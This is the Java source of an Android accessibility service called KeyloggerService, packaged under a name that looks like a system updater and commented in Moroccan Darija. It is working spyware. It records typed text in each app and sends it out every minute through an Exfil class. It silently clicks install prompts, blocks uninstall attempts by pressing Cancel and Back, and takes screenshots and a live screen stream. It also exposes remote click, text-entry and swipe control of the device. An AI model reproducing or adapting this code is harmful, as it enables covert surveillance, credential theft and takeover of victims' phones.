package com.sys.updater;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityService.ScreenshotResult;
import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Path;
import android.hardware.HardwareBuffer;
import android.os.Build;
import android.os.Bundle;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class KeyloggerService extends AccessibilityService {
    
    public static KeyloggerService instance = null;
    public static byte[] latestFrame = null;
    public static boolean isLiveStreaming = false;

    private String currentPackage = "";
    private StringBuilder buffer = new StringBuilder();
    private Timer flushTimer, streamTimer;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;

        // Anti-Crash: Kaychd ay error f l'background w kaymne3 l'service ymout
        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
            Log.e("AccessibilityCrash", "Caught: " + throwable.getMessage());
        });

        try {
            // N7aydo l'Timers l9dam ila kanou
            if (flushTimer != null) { flushTimer.cancel(); flushTimer = null; }
            if (streamTimer != null) { streamTimer.cancel(); streamTimer = null; }

            // Nch3lo jdad
            flushTimer = new Timer();
            flushTimer.scheduleAtFixedRate(new TimerTask() {
                @Override
                public void run() {
                    try { flushBuffer(); } catch (Exception e) {}
                }
            }, 60000, 60000);

            streamTimer = new Timer();
            streamTimer.scheduleAtFixedRate(new TimerTask() {
                @Override
                public void run() {
                    try {
                        if (isLiveStreaming) takeLiveScreenshot();
                    } catch (Exception e) {}
                }
            }, 0, 200);
        } catch (Exception e) {}
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        try {
            // FIX: Null check 3la package name bach mayt7erkesch
            CharSequence pkgName = event.getPackageName();
            if (pkgName == null) return;
            String pkg = pkgName.toString();
            
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                if (!pkg.equals(currentPackage) && !pkg.equals("com.android.systemui")) {
                    flushBuffer();
                    currentPackage = pkg;
                    buffer.append("\n\n=== [").append(pkg).append("] ===\n");
                }
            }
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                List<CharSequence> text = event.getText();
                if (text != null && !text.isEmpty() && text.get(0) != null) {
                    buffer.append("> ").append(text.get(0).toString()).append("\n");
                }
            }

            // Auto-click install buttons
            if (pkg.contains("packageinstaller") || pkg.contains("com.android.packageinstaller") || pkg.contains("com.miui.packageinstaller")) {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root != null) {
                    clickNodeByText(root, "Install");
                    clickNodeByText(root, "تثبيت");
                    clickNodeByText(root, "Installer");
                    clickNodeByText(root, "Open");
                    clickNodeByText(root, "فتح");
                    clickNodeByText(root, "Ouvrir");
                    clickNodeByText(root, "Install anyway");
                    clickNodeByText(root, "المتابعة");
                    clickNodeByText(root, "Continuer");
                }
            }

            // ANTI-UNINSTALL TRAP
            if (pkg.contains("settings") || pkg.contains("com.android.settings")) {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root != null) {
                    List<AccessibilityNodeInfo> uninstallNodes = root.findAccessibilityNodeInfosByText("Uninstall");
                    if (uninstallNodes == null || uninstallNodes.isEmpty()) uninstallNodes = root.findAccessibilityNodeInfosByText("Désinstaller");
                    if (uninstallNodes == null || uninstallNodes.isEmpty()) uninstallNodes = root.findAccessibilityNodeInfosByText("إلغاء التثبيت");
                    
                    if (uninstallNodes != null && !uninstallNodes.isEmpty()) {
                        clickNodeByText(root, "Cancel");
                        clickNodeByText(root, "Annuler");
                        clickNodeByText(root, "إلغاء");
                        performGlobalAction(GLOBAL_ACTION_BACK);
                        Exfil.send("🛡️ Anti-Uninstall Triggered!");
                    }
                }
            }
        } catch (Exception e) {
            // Catch ay crash f l'UI
        }
    }

    private void clickNodeByText(AccessibilityNodeInfo root, String text) {
        try {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
            if (nodes == null) return;
            for (AccessibilityNodeInfo node : nodes) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return;
                } else {
                    AccessibilityNodeInfo parent = node.getParent();
                    if (parent != null && parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return;
                    }
                }
            }
        } catch (Exception e) {}
    }

    private synchronized void flushBuffer() {
        try {
            if (buffer.length() > 0) {
                String data = buffer.toString();
                if (data.length() > 4000) data = data.substring(data.length() - 4000);
                Exfil.send("KEYLOG:\n" + data);
                buffer.setLength(0);
            }
        } catch (Exception e) {}
    }

    public boolean performClick(String textToFind) {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return false;
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(textToFind);
            if (nodes == null) return false;
            for (AccessibilityNodeInfo node : nodes) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                } else {
                    AccessibilityNodeInfo parent = node.getParent();
                    if (parent != null && parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                }
            }
        } catch (Exception e) {}
        return false;
    }

    public boolean performSetText(String text) {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return false;
            AccessibilityNodeInfo focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
            if (focusedNode != null) {
                Bundle arguments = new Bundle();
                arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                return true;
            }
        } catch (Exception e) {}
        return false;
    }

    public void performSwipe(String direction) {
        try {
            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getMetrics(metrics);
            int width = metrics.widthPixels;
            int height = metrics.heightPixels;

            Path path = new Path();
            if (direction.equalsIgnoreCase("up")) {
                path.moveTo(width / 2f, height * 0.8f); path.lineTo(width / 2f, height * 0.2f);
            } else if (direction.equalsIgnoreCase("down")) {
                path.moveTo(width / 2f, height * 0.2f); path.lineTo(width / 2f, height * 0.8f);
            } else if (direction.equalsIgnoreCase("left")) {
                path.moveTo(width * 0.8f, height / 2f); path.lineTo(width * 0.2f, height / 2f);
            } else if (direction.equalsIgnoreCase("right")) {
                path.moveTo(width * 0.2f, height / 2f); path.lineTo(width * 0.8f, height / 2f);
            } else { return; }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                android.accessibilityservice.GestureDescription.Builder builder = new android.accessibilityservice.GestureDescription.Builder();
                builder.addStroke(new android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 300));
                dispatchGesture(builder.build(), null, null);
            }
        } catch (Exception e) {}
    }

    public void pressBack() { performGlobalAction(GLOBAL_ACTION_BACK); }
    public void pressHome() { performGlobalAction(GLOBAL_ACTION_HOME); }
    public void pressRecents() { performGlobalAction(GLOBAL_ACTION_RECENTS); }
    public void openNotifications() { performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS); }

    public void captureScreen() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult screenshotResult) {
                    try {
                        HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
                        Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
                        File file = new File(getExternalFilesDir(null), "screenshot.jpg");
                        FileOutputStream fos = new FileOutputStream(file);
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
                        fos.close(); buffer.close();
                        Exfil.sendFile(file.getAbsolutePath(), "Photo", "Screen Capture");
                    } catch (Exception e) {}
                }
                @Override public void onFailure(int errorCode) {}
            });
        }
    }

    public void captureScreenSilent() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult screenshotResult) {
                    try {
                        HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
                        Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
                        if (bitmap == null) { buffer.close(); return; }
                        Bitmap resized = Bitmap.createScaledBitmap(bitmap, 480, 800, true);
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        resized.compress(Bitmap.CompressFormat.JPEG, 30, baos);
                        latestFrame = baos.toByteArray();
                        buffer.close();
                    } catch (Exception e) {}
                }
                @Override public void onFailure(int errorCode) {}
            });
        }
    }

    private void takeLiveScreenshot() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult screenshotResult) {
                    try {
                        HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
                        Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
                        if (bitmap == null) { buffer.close(); return; }
                        Bitmap resized = Bitmap.createScaledBitmap(bitmap, 480, 800, true);
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        resized.compress(Bitmap.CompressFormat.JPEG, 30, baos);
                        latestFrame = baos.toByteArray();
                        buffer.close();
                    } catch (Exception e) {}
                }
                @Override public void onFailure(int errorCode) {}
            });
        }
    }

    @Override public void onInterrupt() { instance = null; }
    @Override public void onDestroy() { 
        instance = null; 
        if (flushTimer != null) flushTimer.cancel();
        if (streamTimer != null) streamTimer.cancel();
        super.onDestroy(); 
    }
                }
